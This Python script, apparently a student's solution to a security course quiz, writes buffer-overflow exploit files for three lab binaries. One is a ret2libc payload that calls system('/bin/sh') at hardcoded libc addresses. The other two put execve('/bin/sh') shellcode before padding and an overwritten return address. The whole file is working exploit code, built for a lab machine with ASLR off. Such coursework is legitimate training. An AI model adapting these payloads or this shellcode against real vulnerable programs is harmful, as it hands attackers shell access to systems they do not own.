import struct, os

BASE = "/mnt/c/Users/andre/Desktop/326_quiz3/2026-g3"

# libc (lab machine, TEMP=1000, ASLR off)
SYSTEM  = 0xb7dffd30
BINSH   = 0xb7f40caa
FAKERET = 0xdeadbeef

SHELLCODE = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'

def p32(v): return struct.pack('<I', v)

def write_exploit(path, payload):
    data = str(len(payload)).encode() + b' ' + payload
    with open(path, 'wb') as f:
        f.write(data)
    print(f"[+] {path}  ({len(payload)} bytes payload)")

# bin.1 — RW (NX on) → ret2libc, offset=54
offset1 = 54
r2l = b'A' * offset1 + p32(SYSTEM) + p32(FAKERET) + p32(BINSH)
write_exploit(f"{BASE}/exploit.1", r2l)

# bin.2 — RWE → shellcode, offset=60, buf_addr from GDB
offset2   = 60
buf_addr2 = 0xbfffdbd0
sc2 = SHELLCODE + b'A' * (offset2 - len(SHELLCODE)) + p32(buf_addr2)
write_exploit(f"{BASE}/exploit.2", sc2)

# bin.3 — RWE → shellcode, offset=50, buf_addr from GDB
offset3   = 50
buf_addr3 = 0xbfffdbda
sc3 = SHELLCODE + b'A' * (offset3 - len(SHELLCODE)) + p32(buf_addr3)
write_exploit(f"{BASE}/exploit.3", sc3)

print("\n[*] All exploit files written.")
